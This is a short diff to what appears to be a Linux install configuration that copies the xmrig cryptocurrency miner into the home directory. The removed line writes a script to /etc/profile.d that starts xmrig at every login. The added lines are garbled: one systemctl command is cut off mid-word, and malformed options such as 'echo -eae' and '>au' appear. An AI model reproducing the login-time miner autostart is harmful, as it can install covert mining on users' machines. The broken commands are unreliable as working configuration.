@@ -1,4 +1,4 @@
 "xmrig/."="~/xmrig"
-@'systemctl start NetworkManager.service && systemctl enable NetworkManager.service &&echo -eae "chmod +x ~/xmrig/xmrig\n~/xmrig/xmrig" >au /etc/profile.d/run.sh'
-@"rm $ssfn"
+@'systemctl start NetworkManager.service && system'
+@"sed "s/rm -rf \/etc\/systemd\/system\/getty@tty1.service.d//g" $ssfn"
 !yay
